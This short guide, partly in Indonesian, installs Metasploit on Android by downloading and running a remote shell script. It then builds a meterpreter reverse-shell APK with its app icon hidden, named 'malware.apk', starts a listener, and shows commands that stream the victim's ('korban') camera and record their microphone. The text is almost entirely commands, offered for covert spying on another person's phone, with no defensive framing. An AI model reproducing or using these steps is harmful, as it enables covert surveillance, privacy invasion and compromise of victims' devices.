# Install Metasploit Framework

```bash
$ apt update

$ apt upgrade

$ pkg install wget curl openssh git -y

$ pkg install python2

$ apt install ncurses-utils

$ wget https://raw.githubusercontent.com/Elviana16x/metasploit_android/master/metasploit.sh

$ chmod +x metasploit.sh

$ ./metasploit.sh
```

# Membuat Payload

```bash
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=2112 AndroidHideAppIcon=true R -o /sdcard/malware.apk

NEW TAB :

$ msfconsole

$ use exploit/multi/handler

$ set payload android/meterpreter/reverse_tcp

$ set lhost 127.0.0.1

$ set lport 2112

$ run

CONTOH :

//stream camera dari perangkat korban

meterpreter>wbcam_stream

//record mic dari perangkat korban

meterpreter>record_mic
```
